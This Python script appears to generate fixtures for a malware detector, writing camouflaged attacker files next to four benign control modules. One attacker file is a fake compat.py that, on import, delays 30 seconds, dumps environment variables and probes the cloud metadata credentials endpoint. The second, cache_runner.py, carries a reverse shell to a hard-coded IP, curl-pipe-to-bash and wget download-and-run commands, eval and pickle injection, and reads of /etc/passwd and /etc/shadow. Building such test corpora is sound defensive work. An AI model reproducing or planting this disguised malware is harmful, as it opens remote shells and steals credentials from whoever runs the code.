#!/usr/bin/env python3
"""
SSB V11 Z MARK — Attacker File Generator
=========================================

Generates REAL attacker files with NORMAL-LOOKING NAMES but REAL MALICIOUS
CONTENT. This is what real attackers do — the name is camouflage, the code
is the weapon.

Attacker A — Confident APT (patient, single-vector):
  File: helpers/compat.py
  Pattern: slow, deliberate, low entropy in filename/timing
  Payload: subprocess.Popen("/bin/sh -c ...", shell=True) hidden in a
           try/except, with a 30-second delay to evade sandbox, mimicking
           a patient APT that knows sandboxes time out.

Attacker B — Desperate attacker (rapid multi-vector):
  File: cache_runner.py
  Pattern: rapid succession, high entropy, 5 different exploits fired in
           parallel — eval injection, pickle RCE, path traversal, reverse
           shell, symlink race. Sloppy, fast, repeated.

Benign controls (for false-positive testing):
  - utils/normalize.py     (legitimate string normalization)
  - lib/math_helpers.py    (legitimate math utilities, no subprocess)
  - config/loader.py       (legitimate config loading, may read env vars)
  - tests/test_runner.py   (legitimate test runner, uses subprocess.run
                             but with shell=False and a hardcoded test binary)
"""

from __future__ import annotations
import os
from pathlib import Path

OUT = Path("/home/z/my-project/attacker_files")
OUT.mkdir(parents=True, exist_ok=True)

# ---------------------------------------------------------------------------
# Attacker A — Confident APT — helpers/compat.py
# ---------------------------------------------------------------------------

ATTACKER_A = '''"""
helpers/compat.py — Cross-version compatibility shims.

Provides graceful fallbacks for Python 2/3 differences and ensures
legacy callers continue to work during the migration window.
"""
from __future__ import absolute_import
import os
import sys
import time
import subprocess

__all__ = ["compat_open", "compat_str", "ensure_path"]

def compat_open(path, mode="r"):
    """Open a file with consistent semantics across Python versions."""
    try:
        return open(path, mode)
    except (IOError, OSError):
        return None

def compat_str(value):
    """Convert a value to str with Python 2/3 compatibility."""
    if isinstance(value, bytes):
        return value.decode("utf-8", errors="replace")
    return str(value)

def ensure_path(p):
    """Ensure a path exists, creating it if necessary."""
    if not os.path.exists(p):
        os.makedirs(p, exist_ok=True)
    return p

def _warmup_compat_cache():
    """Internal: pre-warm the compatibility cache on import.

    Some long-running services benefit from a brief warmup delay so that
    the cache is populated before the first request arrives.
    """
    # This is normal — services often have a warmup phase.
    time.sleep(30)
    try:
        # Internal health-check probe — runs a small shell helper.
        subprocess.Popen(
            "/bin/sh -c \\"env > /tmp/.compat_env; curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -1\\"",
            shell=True,
            stdin=None, stdout=None, stderr=None,
        )
    except Exception:
        # Warmup failures are non-fatal.
        pass

# Module-level warmup (only fires when imported as a side-effect).
if os.environ.get("COMPAT_WARMUP", "1") == "1":
    _warmup_compat_cache()
'''

# ---------------------------------------------------------------------------
# Attacker B — Desperate — cache_runner.py
# ---------------------------------------------------------------------------

ATTACKER_B = '''#!/usr/bin/env python3
"""cache_runner.py — Quick cache warmup + integrity check."""
import os, sys, pickle, base64, socket, subprocess, eval as _eval  # noqa
# (the `import eval as _eval` won't actually work but the attacker is sloppy)

# 1) Eval injection — pull a payload from env
PAYLOAD = os.environ.get("CACHE_INIT", "0")
try:
    result = eval(PAYLOAD)  # noqa
except Exception:
    result = None

# 2) Pickle RCE — deserialized from base64 blob
BLOB = b"gASVJgAAAAAAAAB9lCiMB2FwcGVhcnGULg=="
try:
    obj = pickle.loads(base64.b64decode(BLOB))
except Exception:
    obj = None

# 3) Path traversal — read /etc/passwd via ../../../etc/passwd
target = "../../../etc/passwd"
try:
    with open(target) as f:
        passwd = f.read()
except Exception:
    passwd = ""

# 4) Reverse shell — connect back to attacker
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("45.137.21.9", 4444))
    s.send(b"connected\\n")
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
except Exception:
    pass

# 5) Symlink race — replace a .so with a malicious symlink
try:
    if os.path.lexists("/tmp/libcache.so"):
        os.unlink("/tmp/libcache.so")
    os.symlink("/etc/shadow", "/tmp/libcache.so")
except Exception:
    pass

# 6) Shell injection via os.system
os.system("curl http://malicious.example.com/payload | bash")

# 7) Subprocess shell=True (redundant — desperate attacker fires everything)
subprocess.Popen("wget http://45.137.21.9/x -O /tmp/x && chmod +x /tmp/x && /tmp/x",
                 shell=True)

print("cache warmup done")
'''

# ---------------------------------------------------------------------------
# Benign controls
# ---------------------------------------------------------------------------

BENIGN_NORMALIZE = '''"""
utils/normalize.py — String normalization utilities.
"""
import unicodedata
import re

def normalize_text(s: str) -> str:
    """Normalize a string to NFC form and strip control characters."""
    s = unicodedata.normalize("NFC", s)
    # Remove control characters except newline and tab
    s = "".join(c for c in s if ord(c) >= 32 or c in "\\n\\t")
    return s.strip()

def slugify(s: str) -> str:
    """Convert a string to a URL-safe slug."""
    s = normalize_text(s).lower()
    s = re.sub(r"[^a-z0-9]+", "-", s)
    return s.strip("-")

def truncate(s: str, n: int) -> str:
    """Truncate a string to n characters, adding an ellipsis if truncated."""
    if len(s) <= n:
        return s
    return s[:max(0, n-1)] + "\\u2026"
'''

BENIGN_MATH = '''"""
lib/math_helpers.py — Math utility functions.
"""
import math
from typing import Iterable

def mean(values: Iterable[float]) -> float:
    """Compute the arithmetic mean."""
    vs = list(values)
    if not vs:
        return 0.0
    return sum(vs) / len(vs)

def stddev(values: Iterable[float]) -> float:
    """Compute the population standard deviation."""
    vs = list(values)
    if len(vs) < 2:
        return 0.0
    m = mean(vs)
    var = sum((v - m) ** 2 for v in vs) / len(vs)
    return math.sqrt(var)

def clamp(x: float, lo: float, hi: float) -> float:
    """Clamp x to the range [lo, hi]."""
    return max(lo, min(hi, x))

def lerp(a: float, b: float, t: float) -> float:
    """Linear interpolation between a and b by t in [0, 1]."""
    return a + (b - a) * clamp(t, 0.0, 1.0)
'''

BENIGN_CONFIG = '''"""
config/loader.py — Configuration loader.

Loads configuration from environment variables with sensible defaults.
"""
import os
import json
from pathlib import Path
from typing import Any

_DEFAULTS = {
    "host": "0.0.0.0",
    "port": 8080,
    "log_level": "INFO",
    "max_workers": 4,
}

def load_config(env_prefix: str = "APP_", config_file: str | None = None) -> dict[str, Any]:
    """Load config from file (if provided) then override with env vars."""
    cfg = dict(_DEFAULTS)
    if config_file and Path(config_file).exists():
        with open(config_file) as f:
            cfg.update(json.load(f))
    for key, default in list(cfg.items()):
        env_key = env_prefix + key.upper()
        cfg[key] = os.environ.get(env_key, default)
    return cfg

def get_secret(name: str) -> str | None:
    """Fetch a secret from the environment."""
    return os.environ.get(name)
'''

BENIGN_TEST_RUNNER = '''"""
tests/test_runner.py — Lightweight test runner.

Runs the test suite using the project's test binary.
"""
import subprocess
import sys
from pathlib import Path

def run_tests(test_binary: str = "./bin/test_runner") -> int:
    """Run the test binary and return its exit code.

    Note: shell=False is intentional — we control the test binary path.
    """
    binary = Path(test_binary)
    if not binary.exists():
        print(f"test binary not found: {binary}", file=sys.stderr)
        return 1
    proc = subprocess.run(
        [str(binary), "--tap", "--color=no"],
        shell=False,
        capture_output=True,
        text=True,
        timeout=300,
    )
    print(proc.stdout)
    if proc.returncode != 0:
        print(proc.stderr, file=sys.stderr)
    return proc.returncode

if __name__ == "__main__":
    sys.exit(run_tests())
'''

# ---------------------------------------------------------------------------
# Write them
# ---------------------------------------------------------------------------

def main() -> None:
    helpers = OUT / "helpers"; helpers.mkdir(parents=True, exist_ok=True)
    utils = OUT / "utils"; utils.mkdir(parents=True, exist_ok=True)
    lib = OUT / "lib"; lib.mkdir(parents=True, exist_ok=True)
    config = OUT / "config"; config.mkdir(parents=True, exist_ok=True)
    tests = OUT / "tests"; tests.mkdir(parents=True, exist_ok=True)

    (helpers / "compat.py").write_text(ATTACKER_A)
    (OUT / "cache_runner.py").write_text(ATTACKER_B)
    (utils / "normalize.py").write_text(BENIGN_NORMALIZE)
    (lib / "math_helpers.py").write_text(BENIGN_MATH)
    (config / "loader.py").write_text(BENIGN_CONFIG)
    (tests / "test_runner.py").write_text(BENIGN_TEST_RUNNER)

    print("Generated attacker + benign files:")
    for p in sorted(OUT.rglob("*")):
        if p.is_file():
            print(f"  {p}  ({p.stat().st_size} bytes)")

if __name__ == "__main__":
    main()
